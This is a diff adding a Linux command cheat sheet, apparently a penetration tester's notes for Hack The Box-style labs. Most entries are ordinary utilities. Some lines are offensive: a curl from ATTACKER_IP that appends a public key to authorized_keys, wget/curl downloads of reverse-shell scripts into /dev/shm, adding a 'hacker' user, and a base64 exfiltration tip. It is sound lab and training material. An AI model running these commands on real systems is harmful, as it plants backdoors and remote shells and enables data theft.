@@ -1,0 +1,101 @@
+#Exfiltration using Base64
+base64 -w 0 file
+
+#Get HexDump without new lines
+xxd -p boot12.bin | tr -d '\n'
+
+#Add public key to authorized keys
+curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authotized_keys
+
+#Echo without new line and Hex
+echo -n -e
+
+#Count
+wc -l <file> #Lines
+wc -c #Chars
+
+#Sort
+sort -nr #Sort by number and then reverse
+cat file | sort | uniq #Sort and delete duplicates
+
+#Replace in file
+sed -i 's/OLD/NEW/g' path/file #Replace string inside a file
+
+#Download in RAM
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
+curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
+
+#Files used by network processes
+lsof -i #Files uses by networks processes
+lsof -i :80 #Files uses by networks processes
+fuser -nv tcp 80
+
+#Decompress
+tar -xvzf /path/to/yourfile.tgz
+tar -xvjf /path/to/yourfile.tbz
+bzip2 -d /path/to/yourfile.bz2
+tar jxf file.tar.bz2
+gunzip /path/to/yourfile.gz
+unzip file.zip
+7z -x file.7z
+sudo apt-get install xz-utils; unxz file.xz
+
+#Add new user
+useradd -p 'openssl passwd -1 <Password>' hacker  
+
+#Clipboard
+xclip -sel c < cat file.txt
+
+#HTTP servers
+python -m SimpleHTTPServer 80
+python3 -m http.server
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
+php -S $ip:80
+
+##Curl
+#json data
+curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
+#Auth via JWT
+curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint
+
+#Send Email
+sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content
+
+#DD copy hex bin file without first X (28) bytes
+dd if=file.bin bs=28 skip=1 of=blob
+
+#Mount .vhd files (virtual hard drive)
+sudo apt-get install libguestfs-tools
+guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd
+
+## ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
+ssh-keyscan 10.10.10.101
+
+## Openssl
+openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
+openssl x509 -in ca.cert.pem -text #Read certificate
+openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
+openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
+openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
+openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
+## If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
+openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
+# Decrypt ssh key
+openssl rsa -in key.ssh.enc -out key.ssh
+#Decrypt
+openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz
+
+#Count number of instructions executed by a program, need a host based linux (not working in VM)
+perf stat -x, -e instructions:u "ls"
+
+##Find trick for HTB, find files from 2018-12-12 to 2018-12-14
+find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -ls 2>/dev/null
+
+#Reconfigure timezone
+sudo dpkg-reconfigure tzdata
+
+#Search from wich package is a binary
+apt-file search /usr/bin/file #Needed: apt-get install apt-file
+
